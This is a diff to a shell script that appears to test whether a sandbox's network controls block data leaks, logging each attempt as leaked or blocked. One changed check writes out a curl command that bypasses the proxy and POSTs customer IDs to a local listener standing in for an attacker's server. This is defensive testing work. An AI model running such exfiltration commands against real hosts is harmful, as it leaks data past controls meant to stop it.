@@ -31,8 +31,9 @@ else
   echo "RESULT|paste|blocked|$out"
 fi
 
-# 5. Ignore the proxy and connect directly
-if out=$(curl -sS --noproxy '*' --connect-timeout 4 -m 6 -o /dev/null -w '%{http_code}' https://www.bing.com 2>&1); then
+# 5. Ignore the proxy and send the data straight to the attacker
+#    (a local listener on 127.0.0.1:9999 stands in for the attacker's server, so this works offline)
+if out=$(curl -sS --noproxy '*' --connect-timeout 4 -m 6 -o /dev/null -w '%{http_code}' -X POST -d 'customers=1000001,1000002' http://127.0.0.1:9999/collect 2>&1); then
   echo "RESULT|direct|leaked|connected directly, HTTP $out"
 else
   echo "RESULT|direct|blocked|$out"
